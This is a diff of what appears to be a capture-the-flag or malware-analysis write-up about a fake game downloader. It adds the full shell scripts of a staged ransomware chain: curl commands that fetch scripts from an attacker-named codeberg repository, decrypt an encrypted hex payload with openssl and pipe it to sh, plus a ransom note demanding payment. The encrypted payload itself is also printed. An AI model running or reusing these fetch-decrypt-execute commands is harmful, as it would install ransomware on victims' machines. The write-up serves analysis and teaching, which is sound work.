@@ -56,12 +56,71 @@ Follow the `codeberg` link, a platform similar to Github, we are presented with 
 
 <img width="959" height="565" alt="image" src="https://github.com/user-attachments/assets/65996ad4-fe87-4e8b-9ebf-2901ab3a5878" />
 
-- `dowloader.sh`
+- `download-minecrap.sh`
+```
+#!/usr/bin/env sh
 
-<img width="1845" height="901" alt="image" src="https://github.com/user-attachments/assets/220c1583-a028-474c-8999-f8f456198c68" />
+printf "Hang tight while were downloading minecrap for you!\n"
+curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/downloader.sh" --output "/tmp/downloader.sh"
+chmod 777 "/tmp/downloader.sh"
+ln -s "/tmp/downloader.sh" "$HOME/minecrap"
+sleep 2
+printf "done!\n"
+```
 
-This script set up a de
+This sets up the deceptive phase while fetching 
 
+
+- `downloader.sh`
+```
+#!/usr/bin/env sh
+
+export AES_KEY="nowsyourchancetobeabigshot"
+
+curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/decrypter.sh" --output "/tmp/decrypter.sh" 
+sh "/tmp/decrypter.sh" &
+
+printf "Downlaoding libraries...\n"
+sleep 2
+
+printf "Downlaoding jutjutsu kaisen mod apk unlimited money...\n"
+sleep 2
+
+printf "Downlaoding shaders with no lag 2019...\n"
+sleep 2
+
+printf "Downlaoding minecrap.exe from mahjong...\n"
+sleep 2
+
+printf "404 FILE NOT FOUND\n"
+sleep 1
+
+printf "Sorry your Minecrap is not available right naow, plaese try agian later."
+```
+
+- `decrypter.sh`
+```
+#!/usr/bin/env sh
+
+SEED="$(printf $AES_KEY | sha256sum)"
+KEY="$(printf $SEED | cut -c 1-32)"
+IV="$(printf $SEED | cut -c 33-64)"
+
+SEED_R="$(printf "$USER-$(hostname)" | sha256sum)"
+export KEY_R="$(printf $SEED_R | cut -c 1-32)"
+export IV_R="$(printf $SEED_R | cut -c 33-64)"
+
+curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/ransom.sh" | xxd -r -p | openssl enc -d -aes-128-cbc -K "$KEY" -iv "$IV" | sh > /dev/null 2>&1
+
+printf 'Ваши файлы зашифрованы, для расшифровки отправьте $36000 на 12345678910 TCB' > "ransom_note_$USER.txt"
+```
+
+
+
+- `ransom.sh`
+```
+823e674b58b8dd29cd35848d171e6fd54ae471c9409c4173858112a8575b4d8ca6ab32ed96f95fe7f5a532f6f2f41b9c5ecd466026d9ce51e3f60ff4107522fb04a6ff8bd464acfe487b2b9dec310d2975cdcaba1fdf71efa945162ea0c6021744c385f3388eb94234c07fca7437787dd9ebf91f9074e13d7b3a526ac2c53dcf1d95f9292990dd3f49d13b3126162e629ad740204c3fd90b468d851a216683a210130534c6bf9744fae78fee3b75c83c562712d58dcfc7051dcc38e1a702c2dbe7434911a9229b1778e6935d6bbacab428103be2fa4a8c056eb83251245a5d6fa2be2af2defa3bba0e921ff7fac6b04c5ea116b858186387bf4b1151db014e7918fa3bb400d7c182f994fc7d3020000029f70bc97d99986f22feb6754e1ad172818b8fa34f7a6cacfcc4bca9f090a69a086b36c0436b4c751bc4ede0f87ada77f5ff5a3b90bb291fbbf87ca400fc3d0af2facc1ee435bfd31593b36a21e7de4477772dee3a9ff933966cbc52a1dd2f696a0e6a37249da613411ce8417f3a4dc1fea753464d46c0cb268ff992b6d716819b306b345402a482ccbd63c4ab5232851dfb668d630ff70d95300357e47f5614b2f3d5b9c4239359773f1129cf5850dad53373db300bde5cdf9407ca453894fe33b296c6b7188301d76ccfcf1b320cd7c482bf74e8b606aabd9b3485494bc82b65e926a8cb183d5be72f086a392585907751b2979f7cdaa2ec91f51bc06cbe8249accd930174a5271b21a870be349a3a59b729572d53dd40db6bcf5f92a6622d7aa391734cf246ced5e72c71e71ab953cdca3ec942a256f21be095834432975498b6015cbdc3f19439238ca001e0ad4d27b1f6b42920a19f4db0f1c994cc03e670d2d83e83dbc8b2bf304b6bd17696111c7ffa401607cccc6b488a4f64032b4e9ff944a18342486c43f7fe86e909da32
+```
 
 
 
